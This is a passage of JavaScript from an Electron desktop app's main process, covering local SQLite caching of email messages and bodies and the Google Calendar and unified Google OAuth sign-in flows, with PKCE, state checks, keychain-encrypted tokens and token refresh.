            isRead = excluded.isRead,
            isStarred = excluded.isStarred,
            labels = excluded.labels,
            data = excluded.data
    `);
    // Only written when the incoming object carries a body, so flag-only
    // re-persists of unopened messages preserve the existing stored body.
    const bodyStmt = dataDb.prepare(`
        INSERT INTO email_bodies (messageId, bodyText, bodyHtml)
        VALUES (@messageId, @bodyText, @bodyHtml)
        ON CONFLICT(messageId) DO UPDATE SET
            bodyText = excluded.bodyText,
            bodyHtml = excluded.bodyHtml
    `);
    const txn = dataDb.transaction((items) => {
        for (const email of items) {
            if (!email?.messageId) continue;
            stmt.run(emailToRow(email));
            if (emailHasBody(email)) {
                bodyStmt.run({
                    messageId: email.messageId,
                    bodyText: email.bodyText ?? null,
                    bodyHtml: email.bodyHtml ?? null
                });
            }
        }
    });
    txn(emails);
    return emails.length;
});

// Lazy body fetch — the list/insights load path never pulls these; the renderer
// requests a single message's body when it's opened, replied to, or analyzed.
ipcMain.handle('emails-get-body', (event, messageId) => {
    if (!emailsDbReady() || !messageId) return null;
    const row = dataDb
        .prepare('SELECT bodyText, bodyHtml FROM email_bodies WHERE messageId = ?')
        .get(messageId);
    return row ? { bodyText: row.bodyText ?? '', bodyHtml: row.bodyHtml ?? '' } : null;
});

ipcMain.handle('emails-update', (event, messageId, patch) => {
    if (!emailsDbReady() || !messageId || !patch) return false;
    const row = dataDb.prepare('SELECT data FROM emails WHERE messageId = ?').get(messageId);
    if (!row) return false;
    const current = rowToEmail(row);
    if (!current) return false;
    const merged = { ...current, ...patch };
    dataDb.prepare(`
        UPDATE emails SET
            account = ?,
            internalDate = ?,
            isRead = ?,
            isStarred = ?,
            labels = ?,
            data = ?
        WHERE messageId = ?
    `).run(
        merged.account || '',
        Number(merged.internalDate) || 0,
        merged.isRead ? 1 : 0,
        merged.isStarred ? 1 : 0,
        JSON.stringify(merged.labels || []),
        JSON.stringify(merged),
        messageId
    );
    return true;
});

ipcMain.handle('emails-delete', (event, messageId) => {
    if (!emailsDbReady() || !messageId) return false;
    const txn = dataDb.transaction(() => {
        dataDb.prepare('DELETE FROM email_bodies WHERE messageId = ?').run(messageId);
        return dataDb.prepare('DELETE FROM emails WHERE messageId = ?').run(messageId);
    });
    return txn().changes > 0;
});

ipcMain.handle('emails-delete-by-account', (event, account) => {
    if (!emailsDbReady() || !account) return 0;
    const txn = dataDb.transaction(() => {
        dataDb.prepare(
            'DELETE FROM email_bodies WHERE messageId IN (SELECT messageId FROM emails WHERE account = ?)'
        ).run(account);
        return dataDb.prepare('DELETE FROM emails WHERE account = ?').run(account);
    });
    return txn().changes;
});

ipcMain.handle('emails-count-by-account', (event, account) => {
    if (!emailsDbReady() || !account) return 0;
    const row = dataDb.prepare('SELECT COUNT(*) AS n FROM emails WHERE account = ?').get(account);
    return row?.n || 0;
});

// Approximate on-disk size of the cached-message tables. Headers live in
// emails.data; the bulk (bodyText/bodyHtml) lives in email_bodies. LENGTH() is
// character count, a close-enough byte estimate for an ASCII-dominant corpus.
// Used by the Storage & Backup "Data Usage" view so Email isn't under-reported —
// its messages live here, not in the app_email kv blob.
ipcMain.handle('emails-db-size', () => {
    if (!emailsDbReady()) return { count: 0, bytes: 0 };
    const row = dataDb.prepare(
        `SELECT COUNT(*) AS n,
                COALESCE(SUM(LENGTH(data) + LENGTH(labels) + LENGTH(messageId)
                             + LENGTH(account) + 24), 0) AS bytes
         FROM emails`
    ).get();
    const bodyRow = dataDb.prepare(
        `SELECT COALESCE(SUM(COALESCE(LENGTH(bodyText), 0) + COALESCE(LENGTH(bodyHtml), 0)), 0) AS bytes
         FROM email_bodies`
    ).get();
    return { count: row?.n || 0, bytes: (row?.bytes || 0) + (bodyRow?.bytes || 0) };
});

// Dashboard-only fast path: count unread INBOX emails across a set of accounts.
// `labels` is stored as a JSON-encoded array in a TEXT column, so we use LIKE
// on the encoded form rather than loading every row into the renderer.
ipcMain.handle('emails-count-unread-inbox', (event, accounts) => {
    if (!emailsDbReady()) return 0;
    if (!Array.isArray(accounts) || accounts.length === 0) return 0;
    const placeholders = accounts.map(() => '?').join(',');
    const row = dataDb
        .prepare(`SELECT COUNT(*) AS n FROM emails
                  WHERE account IN (${placeholders})
                    AND isRead = 0
                    AND labels LIKE '%"INBOX"%'`)
        .get(...accounts);
    return row?.n || 0;
});

// Followed-senders settings: count cached messages whose `from` header contains
// each given term, for a set of accounts, in one round-trip. Avoids the renderer
// scanning every in-memory email per term (O(terms x emails)). `from` lives in
// the JSON `data` column, so we json_extract it; LIKE wildcards in the term are
// escaped so a literal % or _ in an address can't match unexpectedly.
ipcMain.handle('emails-count-by-from-terms', (event, accounts, terms) => {
    if (!emailsDbReady()) return {};
    if (!Array.isArray(accounts) || accounts.length === 0 || !Array.isArray(terms)) return {};
    const placeholders = accounts.map(() => '?').join(',');
    const stmt = dataDb.prepare(
        `SELECT COUNT(*) AS n FROM emails
         WHERE account IN (${placeholders})
           AND LOWER(COALESCE(json_extract(data, '$.from'), '')) LIKE ? ESCAPE '\\'`
    );
    const out = {};
    for (const term of terms) {
        const t = String(term || '').toLowerCase().trim();
        if (!t) { out[term] = 0; continue; }
        const like = '%' + t.replace(/[\\%_]/g, m => '\\' + m) + '%';
        const row = stmt.get(...accounts, like);
        out[term] = row?.n || 0;
    }
    return out;
});

// --- Google Calendar ---

// Minimum scopes for what the app actually does: event CRUD on the user's
// calendars plus reading the calendar list. Deliberately NOT the full
// auth/calendar scope (that adds ACLs/sharing/settings we never touch) —
// Google's OAuth verification rejects apps requesting more than they use.
const CALENDAR_SCOPES = [
    'https://www.googleapis.com/auth/calendar.events',
    'https://www.googleapis.com/auth/calendar.calendarlist.readonly',
];

function getCalendarTokens(email) {
    const encrypted = settingsStore.get(`calendarTokens_${email}`, null);
    if (!encrypted) return null;
    try {
        const decrypted = safeStorage.decryptString(Buffer.from(encrypted, 'base64'));
        return JSON.parse(decrypted);
    } catch (e) {
        // Never delete on decrypt failure — it can be a transient keychain
        // denial (see getGmailTokens).
        console.warn(`[calendar-oauth] Token decrypt failed for ${email} (keeping stored blob):`, e.message);
        return null;
    }
}

// Returns true on success, false when the keychain is unavailable (M9: fail closed).
function setCalendarTokens(email, tokens) {
    if (!safeStorage.isEncryptionAvailable()) {
        console.warn('[calendar-oauth] refusing to store tokens — OS keychain (safeStorage) unavailable');
        return false;
    }
    const encrypted = safeStorage.encryptString(JSON.stringify(tokens)).toString('base64');
    settingsStore.set(`calendarTokens_${email}`, encrypted);
    return true;
}

function removeCalendarTokens(email) {
    settingsStore.delete(`calendarTokens_${email}`);
}

async function refreshCalendarAccessToken(email) {
    const tokens = getCalendarTokens(email);
    if (!tokens?.refresh_token) {
        console.warn(`[calendar-oauth] No refresh token stored for ${email} — re-auth required`);
        return null;
    }

    const creds = getGmailCredentials(); // Same Google OAuth client
    if (!creds.clientId || !creds.clientSecret) {
        console.error('[calendar-oauth] Google OAuth credentials not configured');
        return null;
    }

    return new Promise((resolve) => {
        const postData = new URLSearchParams({
            refresh_token: tokens.refresh_token,
            client_id: creds.clientId,
            client_secret: creds.clientSecret,
            grant_type: 'refresh_token'
        }).toString();

        const req = https.request({
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (result.access_token) {
                        const updated = {
                            ...tokens,
                            access_token: result.access_token,
                            refresh_token: result.refresh_token || tokens.refresh_token,
                            expiry: Date.now() + (result.expires_in * 1000)
                        };
                        setCalendarTokens(email, updated);
                        console.log(`[calendar-oauth] Token refreshed for ${email}, expires in ${result.expires_in}s`);
                        resolve(updated.access_token);
                    } else {
                        console.error(`[calendar-oauth] Refresh failed for ${email}: status=${res.statusCode}, error=${result.error || 'unknown'}, desc=${result.error_description || 'none'}`);
                        if (result.error === 'invalid_grant') {
                            console.warn(`[calendar-oauth] Refresh token revoked/expired for ${email}, clearing stored tokens`);
                            removeCalendarTokens(email);
                        }
                        resolve(null);
                    }
                } catch (e) {
                    console.error(`[calendar-oauth] Refresh response parse error for ${email}:`, e.message, data.slice(0, 200));
                    resolve(null);
                }
            });
        });
        req.on('error', (err) => {
            console.error(`[calendar-oauth] Refresh network error for ${email}:`, err.message);
            resolve(null);
        });
        req.setTimeout(15000, () => {
            req.destroy();
            console.error(`[calendar-oauth] Refresh timeout for ${email}`);
            resolve(null);
        });
        req.write(postData);
        req.end();
    });
}

async function getValidCalendarToken(email) {
    // Prefer the unified Google token. Same fallback rationale as
    // getValidAccessToken — see that function.
    if (settingsStore.get(`googleTokens_${email}`, null)) {
        return await getValidGoogleToken(email);
    }

    const tokens = getCalendarTokens(email);
    if (!tokens) return null;

    if (tokens.access_token && tokens.expiry && Date.now() < tokens.expiry - 60000) {
        return tokens.access_token;
    }

    return await refreshCalendarAccessToken(email);
}

/**
 * Authenticated Calendar API call with automatic refresh-and-retry on 401.
 * Same pattern as gmailApiCall — see that function for the rationale.
 *
 * Also detects SERVICE_DISABLED (the Calendar API is not enabled in the
 * user's Google Cloud Console project) and surfaces a clean, actionable
 * error message with the activation URL instead of dumping the raw JSON.
 */
async function calendarApiCall(email, method, path, body = null) {
    let accessToken = await getValidCalendarToken(email);
    if (!accessToken) {
        return { error: 'Not authenticated. Please reconnect your calendar.', needsReconnect: true };
    }

    let result = await calendarApiRequest(method, path, body, accessToken);

    const code = result?.error?.code || result?.error?.status;
    const is401 = code === 401 || code === 'UNAUTHENTICATED';

    if (is401) {
        console.log(`[calendar-api] 401 on ${method} ${path}, forcing token refresh and retry`);
        accessToken = await refreshCalendarAccessToken(email);
        if (!accessToken) {
            return { error: 'Calendar authentication expired. Please reconnect.', needsReconnect: true };
        }
        result = await calendarApiRequest(method, path, body, accessToken);
    }

    // Detect SERVICE_DISABLED — Google Calendar API isn't enabled in the
    // user's Cloud Console project. Surface a one-line actionable message
    // with the activation URL instead of the full JSON error envelope.
    if (result?.error) {
        const details = result.error.details || [];
        const disabledInfo = details.find(d => d?.reason === 'SERVICE_DISABLED');
        const reason = result.error.errors?.[0]?.reason;
        if (disabledInfo || reason === 'accessNotConfigured') {
            const activationUrl = disabledInfo?.metadata?.activationUrl
                || 'https://console.cloud.google.com/apis/library/calendar-json.googleapis.com';
            return {
                error: `Google Calendar API is not enabled in your Cloud Console project. Enable it at ${activationUrl} then wait ~30 seconds and try again.`,
                needsApiEnable: true,
                activationUrl
            };
        }
    }

    return result;
}

function calendarApiRequest(method, path, body, accessToken) {
    return new Promise((resolve, reject) => {
        const bodyStr = body ? JSON.stringify(body) : null;
        const options = {
            hostname: 'www.googleapis.com',
            path: path,
            method: method,
            headers: {
                'Authorization': `Bearer ${accessToken}`,
                'Content-Type': 'application/json'
            }
        };
        if (bodyStr) {
            options.headers['Content-Length'] = Buffer.byteLength(bodyStr);
        }

        console.log(`[calendar-api] ${method} ${path}`);

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                console.log(`[calendar-api] ${method} ${path} -> ${res.statusCode}`);
                if (res.statusCode === 204) { resolve({ success: true }); return; }
                try {
                    const parsed = JSON.parse(data);
                    if (parsed?.error) {
                        console.error(`[calendar-api] Error:`, JSON.stringify(parsed.error));
                    }
                    resolve(parsed);
                }
                catch { resolve(null); }
            });
        });

        req.on('error', (err) => {
            console.error(`[calendar-api] Request error:`, err.message);
            reject(err);
        });
        req.setTimeout(30000, () => { req.destroy(); reject(new Error('Calendar API timeout')); });

        if (bodyStr) req.write(bodyStr);
        req.end();
    });
}

// Calendar OAuth flow
ipcMain.handle('calendar-start-oauth', async () => {
    const creds = getGmailCredentials();
    if (!creds.clientId || !creds.clientSecret) {
        return { success: false, error: 'Google API credentials not configured.' };
    }

    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    // CSRF guard (SECURITY-AUDIT.md M5): a random state ties the callback to
    // this request. A forged/replayed hit on the loopback carries a wrong or
    // missing state and is rejected before any code is exchanged. `handled`
    // tears the flow down after the first real callback.
    const oauthState = generateCodeVerifier();
    let handled = false;

    return new Promise((resolve) => {
        const server = http.createServer(async (req, res) => {
            const url = new URL(req.url, `http://localhost`);

            if (url.pathname === '/callback') {
                // Ignore extra callbacks once the flow is resolved (favicon
                // hits, double-loads) — tear down after the first real one.
                if (handled) { res.writeHead(204); res.end(); return; }
                // M5: reject any callback whose state doesn't match ours —
                // Google echoes state on both success and error redirects, so
                // a legitimate cancel still matches. Checked before code use.
                const returnedState = url.searchParams.get('state');
                if (!returnedState || returnedState !== oauthState) {
                    handled = true;
                    res.writeHead(400, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Authentication blocked', 'The response could not be verified. Please close this window and try connecting again from Anjadhe.'));
                    server.close();
                    resolve({ success: false, error: 'OAuth state mismatch — this callback was not initiated by Anjadhe' });
                    return;
                }
                handled = true;
                const code = url.searchParams.get('code');
                const error = url.searchParams.get('error');

                if (error) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Sign-in cancelled', 'No changes were made. You can close this window and return to Anjadhe.'));
                    server.close();
                    resolve({ success: false, error });
                    return;
                }

                if (code) {
                    try {
                        const tokenData = await exchangeCodeForTokens(code, creds, server.address().port, codeVerifier);
                        if (tokenData.error) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Sign-in failed', 'Something went wrong during sign-in. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: tokenData.error });
                            return;
                        }

                        // Verify the granted scopes actually include calendar.
                        // Google sometimes silently strips a scope (e.g. if the API
                        // isn't enabled in the Cloud Console project, or if the user
                        // un-checked it on the consent screen). Without this check
                        // we'd happily store a token that fails every API call with
                        // 403 ACCESS_TOKEN_SCOPE_INSUFFICIENT and leave the user
                        // wondering why "reconnect" never works.
                        const grantedScopes = (tokenData.scope || '').split(/\s+/);
                        const hasCalendarScope =
                            grantedScopes.includes('https://www.googleapis.com/auth/calendar.events') ||
                            // Older tokens / consent screens may grant the broad scopes.
                            grantedScopes.includes('https://www.googleapis.com/auth/calendar') ||
                            grantedScopes.includes('https://www.googleapis.com/auth/calendar.readonly');
                        if (!hasCalendarScope) {
                            console.error(`[calendar-oauth] Token granted WITHOUT calendar scope! Granted: ${tokenData.scope}`);
                            const guidance = `Google did not grant calendar access. Likely cause: the Google Calendar API is not enabled in your Cloud Console project. Enable it at https://console.cloud.google.com/apis/library/calendar-json.googleapis.com then try again. (Granted scopes: ${tokenData.scope || 'none'})`;
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Calendar access was not granted', guidance.replace(/&/g, '&amp;').replace(/</g, '&lt;')));
                            server.close();
                            resolve({ success: false, error: guidance });
                            return;
                        }

                        // Get user email from userinfo endpoint
                        const userInfo = await new Promise((resolveInfo, rejectInfo) => {
                            const uReq = https.request({
                                hostname: 'www.googleapis.com',
                                path: '/oauth2/v2/userinfo',
                                method: 'GET',
                                headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
                            }, (uRes) => {
                                let data = '';
                                uRes.on('data', chunk => data += chunk);
                                uRes.on('end', () => {
                                    try { resolveInfo(JSON.parse(data)); }
                                    catch { resolveInfo(null); }
                                });
                            });
                            uReq.on('error', rejectInfo);
                            uReq.end();
                        });

                        const email = userInfo?.email;
                        if (!email) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not read your account', 'Google did not return your email address. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not retrieve email address' });
                            return;
                        }

                        const saved = setCalendarTokens(email, {
                            access_token: tokenData.access_token,
                            refresh_token: tokenData.refresh_token,
                            expiry: Date.now() + (tokenData.expires_in * 1000)
                        });
                        if (!saved) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not save credentials', 'This Mac&rsquo;s keychain is unavailable, so the connection was not stored. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not store credentials securely — this Mac’s keychain is unavailable.' });
                            return;
                        }
                        console.log(`[calendar-oauth] Connected ${email} with scopes: ${tokenData.scope}`);

                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Connected', `The calendar for <strong>${oauthHtmlEscape(email)}</strong> is now linked to Anjadhe. You can close this window and return to the app.`, true));
                        server.close();
                        resolve({ success: true, email });
                    } catch (err) {
                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Authentication error', 'Something went wrong. You can close this window and try again from Anjadhe.'));
                        server.close();
                        resolve({ success: false, error: err.message });
                    }
                }
            }
        });

        server.listen(0, '127.0.0.1', () => {
            const port = server.address().port;
            const redirectUri = `http://127.0.0.1:${port}/callback`;
            const scopes = [...CALENDAR_SCOPES, 'https://www.googleapis.com/auth/userinfo.email'].join(' ');
            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
                `client_id=${encodeURIComponent(creds.clientId)}` +
                `&redirect_uri=${encodeURIComponent(redirectUri)}` +
                `&response_type=code` +
                `&scope=${encodeURIComponent(scopes)}` +
                `&access_type=offline` +
                `&prompt=consent` +
                `&code_challenge=${encodeURIComponent(codeChallenge)}` +
                `&code_challenge_method=S256` +
                `&state=${encodeURIComponent(oauthState)}`;

            const { shell } = require('electron');
            shell.openExternal(authUrl);
        });

        setTimeout(() => {
            server.close();
            resolve({ success: false, error: 'Authentication timed out' });
        }, 5 * 60 * 1000);
    });
});

ipcMain.handle('calendar-revoke-oauth', async (event, email) => {
    removeCalendarTokens(email);
    removeCalendarSyncTokens(email);
    return { success: true };
});

// ──────────────────────────────────────────────────────────────────────────
// Unified Google account OAuth (all services in one grant)
// ──────────────────────────────────────────────────────────────────────────
//
// macOS-style account model: one OAuth grant per account, requesting all
// the scopes for every service we might want (Gmail + Calendar today, more
// later). The single token is stored under googleTokens_${email} and used
// by both gmailApiCall and calendarApiCall via fallback in getValidAccessToken
// / getValidCalendarToken.

// Keep this the MINIMUM set for what the app does — Google's OAuth review
// diffs requested scopes against observed use and rejects over-requests:
// - gmail.modify: read mail, mark read/unread, archive, star, trash, drafts,
//   send. It is the narrowest single scope covering label changes + trash +
//   send (gmail.readonly/send/compose combos can't).
// - calendar.events + calendarlist.readonly: event CRUD and listing the
//   user's calendars. NOT auth/calendar — we never touch ACLs/sharing.
// - userinfo.email: identifies which account a token belongs to. We
//   deliberately do NOT request userinfo.profile (display name only —
//   the UI falls back to the address).
const GOOGLE_UNIFIED_SCOPES = [
    'https://www.googleapis.com/auth/gmail.modify',
    'https://www.googleapis.com/auth/calendar.events',
    'https://www.googleapis.com/auth/calendar.calendarlist.readonly',
    'https://www.googleapis.com/auth/userinfo.email'
];

function getGoogleTokens(email) {
    const encrypted = settingsStore.get(`googleTokens_${email}`, null);
    if (!encrypted) return null;
    try {
        const decrypted = safeStorage.decryptString(Buffer.from(encrypted, 'base64'));
        return JSON.parse(decrypted);
    } catch (e) {
        // Never delete on decrypt failure — it can be a transient keychain
        // denial (see getGmailTokens).
        console.warn(`[google-oauth] Token decrypt failed for ${email} (keeping stored blob):`, e.message);
        return null;
    }
}

// Returns true on success, false when the keychain is unavailable (M9: fail closed).
function setGoogleTokens(email, tokens) {
    if (!safeStorage.isEncryptionAvailable()) {
        console.warn('[google-oauth] refusing to store tokens — OS keychain (safeStorage) unavailable');
        return false;
    }
    const encrypted = safeStorage.encryptString(JSON.stringify(tokens)).toString('base64');
    settingsStore.set(`googleTokens_${email}`, encrypted);
    return true;
}

function removeGoogleTokens(email) {
    settingsStore.delete(`googleTokens_${email}`);
}

async function refreshGoogleAccessToken(email) {
    const tokens = getGoogleTokens(email);
    if (!tokens?.refresh_token) {
        console.warn(`[google-oauth] No refresh token stored for ${email}`);
        return null;
    }

    const creds = getGmailCredentials();
    if (!creds.clientId || !creds.clientSecret) {
        console.error('[google-oauth] OAuth credentials not configured');
        return null;
    }

    return new Promise((resolve) => {
        const postData = new URLSearchParams({
            refresh_token: tokens.refresh_token,
            client_id: creds.clientId,
            client_secret: creds.clientSecret,
            grant_type: 'refresh_token'
        }).toString();

        const req = https.request({
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (result.access_token) {
                        const updated = {
                            ...tokens,
                            access_token: result.access_token,
                            refresh_token: result.refresh_token || tokens.refresh_token,
                            expiry: Date.now() + (result.expires_in * 1000),
                            scope: result.scope || tokens.scope
                        };
                        setGoogleTokens(email, updated);
                        console.log(`[google-oauth] Token refreshed for ${email}`);
                        resolve(updated.access_token);
                    } else {
                        console.error(`[google-oauth] Refresh failed for ${email}: ${result.error || 'unknown'} - ${result.error_description || ''}`);
                        if (result.error === 'invalid_grant') {
                            console.warn(`[google-oauth] Refresh token revoked, clearing tokens for ${email}`);
                            removeGoogleTokens(email);
                        }
                        resolve(null);
                    }
                } catch (e) {
                    console.error(`[google-oauth] Refresh parse error for ${email}:`, e.message);
                    resolve(null);
                }
            });
        });
        req.on('error', (err) => {
            console.error(`[google-oauth] Refresh network error:`, err.message);
            resolve(null);
        });
        req.setTimeout(15000, () => {
            req.destroy();
            console.error(`[google-oauth] Refresh timeout for ${email}`);
            resolve(null);
        });
        req.write(postData);
        req.end();
    });
}

async function getValidGoogleToken(email) {
    const tokens = getGoogleTokens(email);
    if (!tokens) return null;
    if (tokens.access_token && tokens.expiry && Date.now() < tokens.expiry - 60000) {
        return tokens.access_token;
    }
    return await refreshGoogleAccessToken(email);
}

ipcMain.handle('account-google-oauth', async () => {
    const creds = getGmailCredentials();
    if (!creds.clientId || !creds.clientSecret) {
        return { success: false, error: 'Google API credentials not configured. Set GMAIL_CLIENT_ID and GMAIL_CLIENT_SECRET in .env.' };
    }

    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    // CSRF guard (SECURITY-AUDIT.md M5): a random state ties the callback to
    // this request. A forged/replayed hit on the loopback carries a wrong or
    // missing state and is rejected before any code is exchanged. `handled`
    // tears the flow down after the first real callback.
    const oauthState = generateCodeVerifier();
    let handled = false;

    return new Promise((resolve) => {
        const server = http.createServer(async (req, res) => {
            const url = new URL(req.url, `http://localhost`);

            if (url.pathname === '/callback') {
                // Ignore extra callbacks once the flow is resolved (favicon
                // hits, double-loads) — tear down after the first real one.
                if (handled) { res.writeHead(204); res.end(); return; }
                // M5: reject any callback whose state doesn't match ours —
                // Google echoes state on both success and error redirects, so
                // a legitimate cancel still matches. Checked before code use.
                const returnedState = url.searchParams.get('state');
                if (!returnedState || returnedState !== oauthState) {
                    handled = true;
                    res.writeHead(400, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Authentication blocked', 'The response could not be verified. Please close this window and try connecting again from Anjadhe.'));
                    server.close();
                    resolve({ success: false, error: 'OAuth state mismatch — this callback was not initiated by Anjadhe' });
                    return;
                }
                handled = true;
                const code = url.searchParams.get('code');
                const error = url.searchParams.get('error');

                if (error) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Sign-in cancelled', 'No changes were made. You can close this window and return to Anjadhe.'));
                    server.close();
                    resolve({ success: false, error });
                    return;
                }

                if (code) {
                    try {
                        const tokenData = await exchangeCodeForTokens(code, creds, server.address().port, codeVerifier);
                        if (tokenData.error) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Sign-in failed', 'Something went wrong during sign-in. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: tokenData.error });
                            return;
                        }

                        // Identify which services were actually granted
                        const grantedScopes = (tokenData.scope || '').split(/\s+/);
                        const services = [];
                        if (grantedScopes.some(s => s.startsWith('https://www.googleapis.com/auth/gmail.'))) {
                            services.push('mail');
                        }
                        if (grantedScopes.some(s => s.startsWith('https://www.googleapis.com/auth/calendar'))) {
                            services.push('calendar');
                        }

                        // Get user email from userinfo (no profile scope, so
                        // `name` is absent — the UI falls back to the address)
                        const userInfo = await new Promise((resolveInfo) => {
                            const uReq = https.request({
                                hostname: 'www.googleapis.com',
                                path: '/oauth2/v2/userinfo',
                                method: 'GET',
                                headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
                            }, (uRes) => {
                                let data = '';
                                uRes.on('data', chunk => data += chunk);
                                uRes.on('end', () => {
                                    try { resolveInfo(JSON.parse(data)); }
                                    catch { resolveInfo(null); }
                                });
                            });
                            uReq.on('error', () => resolveInfo(null));
                            uReq.end();
                        });

                        const email = userInfo?.email;
                        if (!email) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not read your account', 'Google did not return your email address. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not retrieve email address' });
                            return;
                        }

                        // Store the unified token. Both gmailApiCall and calendarApiCall
                        // will fall back to this via getValidAccessToken /
                        // getValidCalendarToken — see those functions.
                        const saved = setGoogleTokens(email, {
                            access_token: tokenData.access_token,
                            refresh_token: tokenData.refresh_token,
                            expiry: Date.now() + (tokenData.expires_in * 1000),
                            scope: tokenData.scope
                        });
                        if (!saved) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not save credentials', 'This Mac&rsquo;s keychain is unavailable, so the connection was not stored. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not store credentials securely — this Mac’s keychain is unavailable.' });
                            return;
                        }
                        console.log(`[google-oauth] Connected ${email} with services: ${services.join(', ')} (scopes: ${tokenData.scope})`);

                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Connected', `<strong>${oauthHtmlEscape(email)}</strong> is now linked to Anjadhe with ${services.length} service${services.length === 1 ? '' : 's'} (${oauthHtmlEscape(services.join(', '))}). You can close this window and return to the app.`, true));
                        server.close();
                        resolve({ success: true, email, displayName: userInfo?.name, services });
                    } catch (err) {
                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Authentication error', 'Something went wrong. You can close this window and try again from Anjadhe.'));
                        server.close();
                        resolve({ success: false, error: err.message });
                    }
                }
            }
        });

        server.listen(0, '127.0.0.1', () => {
            const port = server.address().port;
            const redirectUri = `http://127.0.0.1:${port}/callback`;
            const scopes = GOOGLE_UNIFIED_SCOPES.join(' ');
            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
                `client_id=${encodeURIComponent(creds.clientId)}` +
                `&redirect_uri=${encodeURIComponent(redirectUri)}` +
                `&response_type=code` +
                `&scope=${encodeURIComponent(scopes)}` +
                `&access_type=offline` +
                `&prompt=consent` +
                `&code_challenge=${encodeURIComponent(codeChallenge)}` +
                `&code_challenge_method=S256` +
                `&state=${encodeURIComponent(oauthState)}`;

            const { shell } = require('electron');
            shell.openExternal(authUrl);
        });

        setTimeout(() => {
            server.close();
            resolve({ success: false, error: 'Authentication timed out' });
        }, 5 * 60 * 1000);
    });
});

ipcMain.handle('account-google-revoke', async (event, email) => {
    removeGoogleTokens(email);
    // Also clean up any legacy gmail/calendar token entries for the same
    // email so the unified disconnect actually disconnects everything.
    removeGmailTokens(email);
    removeCalendarTokens(email);
    // Stale incremental cursors would poison the next connect's first sync.
    removeCalendarSyncTokens(email);
    return { success: true };
});

// List calendars
ipcMain.handle('calendar-list-calendars', async (event, email) => {
    try {
        const result = await calendarApiCall(email, 'GET', '/calendar/v3/users/me/calendarList');
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to list calendars' };

        const calendars = (result?.items || []).map(cal => ({
            id: cal.id,
            summary: cal.summary,
            backgroundColor: cal.backgroundColor,
            primary: cal.primary || false,
            // Mirrors the calendar checkboxes in Google's own UI — the sync
            // uses it to fetch the same set of calendars the user sees there.
            selected: cal.selected || false,
            accessRole: cal.accessRole || 'reader'
        }));

        return { calendars };
    } catch (err) {
        return { error: err.message };
    }
});

function mapCalendarEvent(ev, calendarId) {
    return {
        id: ev.id,
        calendarId,
        // Incremental sync reports deletions as bare {id, status:'cancelled'}
        // stubs, so status must survive the mapping.
        status: ev.status || 'confirmed',
        summary: ev.summary || '',
        description: ev.description || '',
        location: ev.location || '',
        start: ev.start?.dateTime || ev.start?.date || null,
        end: ev.end?.dateTime || ev.end?.date || null,
        allDay: !!(ev.start && !ev.start.dateTime),
        htmlLink: ev.htmlLink || '',
        colorId: ev.colorId || null,
        attendees: (ev.attendees || []).map(a => ({
            email: a.email,
            displayName: a.displayName,
            responseStatus: a.responseStatus
        })),
        recurrence: ev.recurrence || null,
        recurringEventId: ev.recurringEventId || null
    };
}

// One paginated events.list pass over a single calendar — either a full
// windowed fetch (timeMin/timeMax) or an incremental one (syncToken, which
// Google forbids combining with time bounds). The page cap bounds a
// pathological calendar (8 × 250 rows per window) without stalling sync.
async function fetchCalendarEvents(email, calendarId, { syncToken, timeMin, timeMax }) {
    const events = [];
    let pageToken = null;
    let nextSyncToken = null;

    for (let page = 0; page < 8; page++) {
        const params = new URLSearchParams({
            maxResults: '250',
            singleEvents: 'true'
        });
        if (syncToken) {
            params.set('syncToken', syncToken);
        } else {
            if (timeMin) params.set('timeMin', timeMin);
            if (timeMax) params.set('timeMax', timeMax);
        }
        if (pageToken) params.set('pageToken', pageToken);

        const result = await calendarApiCall(
            email,
            'GET',
